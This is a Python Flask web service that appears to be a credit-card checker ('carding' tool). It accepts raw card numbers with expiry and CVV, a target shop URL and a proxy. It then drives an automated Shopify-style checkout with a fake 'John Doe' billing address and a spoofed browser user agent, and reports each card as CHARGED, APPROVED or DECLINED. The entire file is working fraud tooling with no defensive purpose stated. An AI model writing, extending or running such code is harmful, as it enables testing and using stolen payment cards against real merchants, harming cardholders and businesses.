import os
import json
import re
import httpx
from flask import Flask, request, jsonify
from urllib.parse import urljoin

app = Flask(__name__)

PORT = int(os.environ.get("PORT", 8099))
TIMEOUT = 30.0
USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
DEFAULT_VARIANT_ID = os.environ.get("DEFAULT_VARIANT_ID", None)

def parse_card(card_str):
    parts = card_str.split('|')
    return {"number": parts[0].strip(), "month": parts[1].strip(), "year": parts[2].strip(), "cvv": parts[3].strip()}

def normalize_year(y):
    return "20" + y if len(y) == 2 else y

def parse_shop_url(url):
    url = url.strip()
    if not url.startswith(("http://", "https://")):
        url = "https://" + url
    return url.rstrip('/')

def get_proxy_url(proxy):
    if not proxy:
        return None
    proxy = proxy.strip()
    if not proxy.startswith(("http://", "https://", "socks5://")):
        proxy = "http://" + proxy
    return proxy

def get_variant_id(client, shop_url):
    """Synchronous version"""
    if DEFAULT_VARIANT_ID:
        return DEFAULT_VARIANT_ID
    try:
        resp = client.get(shop_url)
        if resp.status_code != 200:
            return None
        matches = re.findall(r'/products/([a-zA-Z0-9\-]+)', resp.text)
        if not matches:
            return None
        handle = matches[0]
        prod_url = urljoin(shop_url, f"/products/{handle}.js")
        vresp = client.get(prod_url)
        if vresp.status_code != 200:
            return None
        data = vresp.json()
        variants = data.get("variants", [])
        if variants:
            return str(variants[0]["id"])
    except Exception as e:
        app.logger.error(f"get_variant_id error: {e}")
    return None

def perform_checkout(card_data, shop_url, proxy):
    proxy_url = get_proxy_url(proxy)
    with httpx.Client(
        timeout=TIMEOUT,
        follow_redirects=True,
        headers={"User-Agent": USER_AGENT, "Accept": "application/json, text/plain, */*", "Content-Type": "application/json"},
        proxies=proxy_url
    ) as client:
        variant_id = get_variant_id(client, shop_url)
        if not variant_id:
            return {"status": "ERROR", "message": "No product found", "retryable": True}

        # Add to cart
        add_url = urljoin(shop_url, "/cart/add.js")
        add_payload = {"id": variant_id, "quantity": 1}
        try:
            resp = client.post(add_url, json=add_payload)
            if resp.status_code != 200:
                return {"status": "ERROR", "message": f"Cart add failed (HTTP {resp.status_code})", "retryable": True}
            cart_data = resp.json()
            checkout_token = cart_data.get("items", [{}])[0].get("checkout_token")
            if not checkout_token:
                return {"status": "ERROR", "message": "No checkout token", "retryable": True}
        except Exception as e:
            return {"status": "ERROR", "message": f"Cart error: {str(e)}", "retryable": True}

        # Set billing address
        billing = {
            "billing_address": {
                "first_name": "John", "last_name": "Doe",
                "address1": "123 Main St", "city": "New York",
                "province": "NY", "zip": "10001",
                "country": "US", "phone": "2125555555", "company": ""
            }
        }
        bill_url = f"{shop_url}/checkout/{checkout_token}/billing_address.json"
        try:
            resp = client.post(bill_url, json=billing)
            if resp.status_code not in (200, 201):
                return {"status": "ERROR", "message": "Failed to set billing address", "retryable": True}
        except Exception as e:
            return {"status": "ERROR", "message": f"Billing error: {str(e)}", "retryable": True}

        # Submit payment
        payment_payload = {
            "payment": {
                "credit_card": {
                    "number": card_data["number"],
                    "month": card_data["month"],
                    "year": normalize_year(card_data["year"]),
                    "verification_value": card_data["cvv"],
                    "first_name": "John", "last_name": "Doe"
                },
                "billing_address": billing["billing_address"]
            }
        }
        pay_url = f"{shop_url}/checkout/{checkout_token}/payment.json"
        try:
            resp = client.post(pay_url, json=payment_payload)
            if resp.status_code == 200:
                result = resp.json()
                status = result.get("status")
                if status == "completed":
                    return {"status": "CHARGED", "message": "Payment captured", "amount": result.get("amount", "0.00"), "gateway": "Shopify Payments", "receipt_url": result.get("receipt_url", ""), "retryable": False}
                elif status == "authorized":
                    return {"status": "APPROVED", "message": "Auth approved", "amount": result.get("amount", "0.00"), "gateway": "Shopify Payments", "receipt_url": "", "retryable": False}
                else:
                    msg = result.get("message", "Unknown decline")
                    if "insufficient" in msg.lower():
                        return {"status": "DECLINED", "message": "Insufficient funds", "retryable": False}
                    elif "3d" in msg.lower() or "3d_secure" in msg.lower():
                        return {"status": "DECLINED", "message": "3DS required", "retryable": False}
                    else:
                        return {"status": "DECLINED", "message": msg, "retryable": False}
            else:
                text = resp.text
                if "3d" in text.lower() or "3d_secure" in text.lower():
                    return {"status": "DECLINED", "message": "3DS required", "retryable": False}
                return {"status": "DECLINED", "message": f"Payment failed (HTTP {resp.status_code})", "retryable": False}
        except httpx.TimeoutException:
            return {"status": "ERROR", "message": "Payment timeout", "retryable": True}
        except Exception as e:
            app.logger.error(f"Payment exception: {e}")
            return {"status": "ERROR", "message": f"Payment error: {str(e)}", "retryable": True}

@app.route('/check', methods=['POST'])
def check():
    data = request.get_json()
    if not data:
        return jsonify({"status": "ERROR", "message": "Missing JSON"}), 400
    card_str = data.get('card')
    shop_url = data.get('shop_url')
    proxy = data.get('proxy', '')
    if not card_str or not shop_url:
        return jsonify({"status": "ERROR", "message": "Missing card or shop_url"}), 400
    try:
        card = parse_card(card_str)
        shop_url = parse_shop_url(shop_url)
        result = perform_checkout(card, shop_url, proxy)
        return jsonify(result)
    except Exception as e:
        app.logger.error(f"Unhandled error: {e}")
        return jsonify({"status": "ERROR", "message": str(e), "retryable": True}), 500

@app.route('/health', methods=['GET'])
def health():
    return jsonify({"status": "ok"})

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 8099))
    app.run(host='0.0.0.0', port=port)
